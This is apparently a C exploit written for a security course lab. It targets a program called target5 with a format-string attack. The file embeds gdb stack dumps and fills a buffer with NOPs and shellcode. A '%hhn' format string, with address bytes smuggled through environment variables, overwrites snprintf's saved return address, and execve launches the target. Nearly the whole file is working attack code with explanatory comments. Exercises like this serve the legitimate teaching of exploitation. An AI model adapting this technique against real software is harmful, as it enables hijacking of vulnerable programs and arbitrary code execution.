#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

/*
  In foo:
  Stack level 0, frame at 0x3021feb0:
  rip = 0x400be0 in foo (target5.c:38); saved rip = 0x400e09
  called by frame at 0x3021fed0
  source language c.
  Arglist at 0x3021fea0, args: arg=0x7fffffffd856 "1111"
  Locals at 0x3021fea0, Previous frame's sp is 0x3021feb0
  Saved registers:
    rbp at 0x3021fea0, rip at 0x3021fea8
  (gdb) p &buf
  $1 = (char (*)[1024]) 0x3021faa0
  (gdb) p &formatString
  $2 = (char (*)[256]) 0x3021f9a0

  --------------------------------------------------------------

  In snprintf:
  Stack level 0, frame at 0x3021f990:
  rip = 0x7ffff7857f20 in snprintf; saved rip = 0x400d94
  called by frame at 0x3021feb0
  Arglist at 0x3021f980, args: 
  Locals at 0x3021f980, Previous frame's sp is 0x3021f990
  Saved registers:
    rip at 0x3021f988
*/

int main(void)
{
  char *args[3];
  char *env[20];

  char buf[256];

  // Fill up the buffer with NOP
  for (int i = 0; i < 256; i++) {
      buf[i] = '\x90';
  }

  /*
    Inject shellcode at the beginning of the buffer;
    Therefore the address of shellcode will be 0x3021f9a0;
    This address will be used to overwrite the return address.

    The first 4 bytes are left because the format string is read starting from 60th bytes,
    and our strategy accommandates 64 bytes at the beginning of the format string,
    which results in 4 null bytes starting from 60th.
    Therefore another 4 bytes are used to complete the alignment as 4 + 4 = 8.
  */
  int shellcode_len = strlen(shellcode);
  for(int i = 0; i < strlen(shellcode); i++){
		buf[4 + i] = shellcode[i];
	}

  // Encode format string to achieve desired hack
  /*
    Partition 0x3021f9a0:
    0xa0: 160
    0xf9: 249
    0x21: 33
    0x30: 48

    Calculate the difference as %hhn writes the culmulative printed length:
    0xa0 - 45 - 40 = 75
    0xf9 - 0xa0 = 89
    0x121 - 0x0f9 = 40
    0x30 - 0x21 = 15

    Here in the 3rd calculation, 40 is added.
    So the culmulative length is 0xf9 + 40 = 289 (0x121), exceeding 1 byte in size.
    Specifier %hhn writes LSB, which is just 0x21.
  */
  char format_content[] = "%40x%75x%hhn%89x%hhn%40x%hhn%15x%hhn";
  memcpy(&buf[49], format_content, strlen(format_content));

  buf[255] = '\x00';

  // Return address to be overwritten: 0x3021f988 (rip within snprintf frame)
  char ret_addr_1[5] = "\x88\xf9\x21\x30";
  char ret_addr_2[5] = "\x89\xf9\x21\x30";
  char ret_addr_3[5] = "\x8a\xf9\x21\x30";
  char ret_addr_4[5] = "\x8b\xf9\x21\x30";

  // // Return address to be overwritten: 0x3021fea8 (rip within foo frame)
  // char addr_1[] = "\xa8\xfe\x21\x30";
  // char addr_2[] = "\xa9\xfe\x21\x30";
  // char addr_3[] = "\xaa\xfe\x21\x30";
  // char addr_4[] = "\xab\xfe\x21\x30";

  // Encode env to accommodate null bytes
  args[0] = TARGET; 
  args[1] = ret_addr_1; 
  args[2] = NULL;
  
  env[0] = "\x00";
  env[1] = "\x00";
  env[2] = "\x00";
  env[3] = "fffffff";
  // Here the size is 7 bytes for 'A' + 1 byte for NULL = 8 Bytes
  
  env[4] =  ret_addr_2;
  env[5] = "\x00";
  env[6] = "\x00";
  env[7] = "\x00";
  env[8] = "fffffff";

  env[9] = ret_addr_3;
  env[10] = "\x00";
  env[11] = "\x00";
  env[12] = "\x00";
  env[13] = "fffffff";

  env[14] = ret_addr_4;
  env[15] = "\x00";
  env[16] = "\x00";
  env[17] = "\x00";

  env[18] = buf;
  env[19] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
